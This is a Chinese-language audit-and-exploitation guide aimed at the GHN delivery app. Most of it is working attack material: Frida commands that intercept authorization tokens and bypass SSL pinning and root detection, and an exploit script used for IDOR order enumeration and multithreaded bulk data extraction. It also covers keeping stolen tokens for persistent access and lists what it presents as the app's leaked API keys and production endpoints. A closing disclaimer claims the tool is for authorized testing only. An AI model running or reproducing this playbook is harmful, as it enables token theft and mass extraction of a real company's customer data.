# GHN App 代码审计与利用指南

## 📋 目录
1. [审计报告](#审计报告)
2. [利用工具](#利用工具)
3. [使用方法](#使用方法)
4. [高级技巧](#高级技巧)

---

## 📄 审计报告

### 文件位置
```
/workspace/GHN_COMPLETE_AUDIT_REPORT.md
```

### 报告包含
- ✅ 硬编码密钥泄露详情
- ✅ 核心API端点分析
- ✅ 认证机制剖析
- ✅ 第三方服务集成漏洞
- ✅ 攻击面分析
- ✅ 修复建议

---

## 🛠️ 利用工具

### 1. Frida Hook脚本

**文件**: `/workspace/ghn_advanced_frida_hook.js`

**功能**:
- 拦截所有HTTP(S)请求和响应
- 提取Authorization Token
- 导出BuildConfig中的所有密钥
- 绕过SSL Pinning
- Hook SharedPreferences读写
- 监控Activity启动
- 拦截Retrofit API调用

**使用方法**:
```bash
# 方法1: 通过USB连接设备
frida -U -f vn.ghn.app.giaohangnhanh -l ghn_advanced_frida_hook.js --no-pause

# 方法2: 连接到运行中的进程
frida -U -n "GHN" -l ghn_advanced_frida_hook.js

# 方法3: 通过网络连接（远程设备）
frida -H 192.168.1.100:27042 -n "GHN" -l ghn_advanced_frida_hook.js
```

**输出示例**:
```
[HTTP REQUEST]
URL: https://online-gateway.ghn.vn/shiip-nodejs/v2/orders
Method: GET
Headers:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  🔑 [TOKEN FOUND]: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

---

### 2. Python自动化Exploit

**文件**: `/workspace/ghn_api_exploit.py`

**功能**:
- 使用泄露密钥测试Analytics API
- 测试物流跟踪API
- IDOR订单枚举
- FPT eKYC API测试
- SSO接口测试
- Google Maps API验证

**使用方法**:

#### 全面测试（推荐）
```bash
python3 ghn_api_exploit.py --mode all
```

#### 单独测试模块
```bash
# 测试Analytics API
python3 ghn_api_exploit.py --mode analytics

# 测试跟踪API
python3 ghn_api_exploit.py --mode tracking --tracking-code GHN123456789

# IDOR枚举（测试订单1-100）
python3 ghn_api_exploit.py --mode idor --order-start 1 --order-count 100

# 测试eKYC
python3 ghn_api_exploit.py --mode ekyc

# 测试SSO
python3 ghn_api_exploit.py --mode sso

# 测试Google Maps
python3 ghn_api_exploit.py --mode maps
```

**输出示例**:
```
============================================================
GHN API 自动化利用工具
============================================================
开始时间: 2025-10-24 10:30:15
============================================================

[*] 测试Analytics API...
[+] Analytics凭证: customer:qQQEPch8diBLl1VGnJxk66TnQYjhRLZ1
[+] 状态码: 200
[+] 响应: {"success":true,"data":[...]}

[测试摘要]
总测试数: 5
成功: 3
失败: 2

[+] 报告已保存至: ghn_exploit_report_20251024_103045.json
```

---

## 🚀 使用方法

### 准备工作

1. **安装依赖**
```bash
# Frida
pip3 install frida-tools

# Python库
pip3 install requests

# 检查设备连接
adb devices
frida-ps -U
```

2. **设备准备**
```bash
# Root设备（可选，提高成功率）
# 安装Magisk或SuperSU

# 安装Frida Server
adb root
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

3. **安装目标App**
```bash
# 如果已安装，跳过此步骤
adb install ghn.apk
```

---

### 标准渗透测试流程

#### 阶段1: 信息收集（Frida）
```bash
# 1. 启动App并Hook
frida -U -f vn.ghn.app.giaohangnhanh -l ghn_advanced_frida_hook.js --no-pause

# 2. 在App中登录并操作
#    - 查看订单
#    - 创建新订单
#    - 修改个人信息

# 3. 观察Frida输出，收集:
#    - Authorization Token
#    - API端点
#    - 请求参数
#    - 响应数据
```

#### 阶段2: 漏洞验证（Python）
```bash
# 使用收集的Token测试API
export GHN_TOKEN="从Frida中提取的Token"

# 修改exploit脚本，添加Token
# 然后执行全面测试
python3 ghn_api_exploit.py --mode all
```

#### 阶段3: 漏洞利用
```bash
# 基于发现的漏洞编写自定义exploit
# 例如: IDOR枚举所有订单
python3 ghn_api_exploit.py --mode idor --order-start 1 --order-count 10000
```

---

## 🎯 高级技巧

### 1. 绕过Root检测
```javascript
// 在Frida脚本中添加
Java.perform(function() {
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() {
        console.log("[Root Detection] Bypassed");
        return false;
    };
});
```

### 2. 自动化Token刷新
```python
# 在exploit中添加Token刷新逻辑
def refresh_token(self, old_token):
    response = self.session.post(
        f"{self.SSO_URL}/oauth/token/refresh",
        json={"refresh_token": old_token}
    )
    return response.json()['access_token']
```

### 3. 批量数据提取
```python
# IDOR + 多线程
from concurrent.futures import ThreadPoolExecutor

def batch_enum_orders(start, end, threads=10):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(exploit.test_order, order_id)
            for order_id in range(start, end)
        ]
        results = [f.result() for f in futures]
    return results
```

### 4. 持久化访问
```bash
# 导出提取的Token保存
echo "TOKEN=eyJhbGc..." > .ghn_tokens
echo "REFRESH_TOKEN=..." >> .ghn_tokens

# 在脚本中加载
source .ghn_tokens
python3 ghn_api_exploit.py --token $TOKEN
```

---

## 🔍 关键发现速查

### 硬编码密钥
```
AppsFlyer:   qrTQMv2AyzpzKJCwYEZuvX
FPT eKYC:    xeV5x63Aj33jl9JmKPhrNsD8xzcqA5UV
Analytics:   customer:qQQEPch8diBLl1VGnJxk66TnQYjhRLZ1
Google Maps: AIzaSyBGtfiDL1GF7QvqIqYb-gWAPDZeYEn8X_Y
SSO App Key: d6a4ae02-b16b-4eca-bea8-ab4c0fbf55b6
```

### API端点
```
主网关:   https://fe-online-gateway.ghn.vn
订单API:  https://online-gateway.ghn.vn/shiip-nodejs/v2
跟踪:     https://tracking.ghn.vn
SSO:      https://sso.ghn.vn
测试环境: https://test-api.tracking.ghn.tech
```

### reCAPTCHA Keys
```
主站点:   6LfOe9UZAAAAAOtftN3iVCiUt7AJ4hg37sSBha9H
OTP:      6LeJwjUqAAAAAJapXLHNeA7ROLhMztDcVKkijtQh
OTP v2:   6LdIz-EqAAAAABJ8F-43ZJDZX3ac2zIJk4WaBGRC
```

---

## ⚠️ 法律声明

本工具仅用于**授权安全测试**。未经授权使用可能违反相关法律法规。

使用前请确保：
1. ✅ 已获得书面授权
2. ✅ 在受控环境中测试
3. ✅ 遵守当地法律
4. ✅ 不造成实际损害

---

## 📞 技术支持

如需更详细的技术支持或定制化开发：
- 查看完整审计报告: `GHN_COMPLETE_AUDIT_REPORT.md`
- Frida脚本: `ghn_advanced_frida_hook.js`
- Python工具: `ghn_api_exploit.py`

---

**审计完成时间**: 2025-10-24  
**工具版本**: v1.0  
**目标App版本**: GHN 4.10.6 (Build 191)
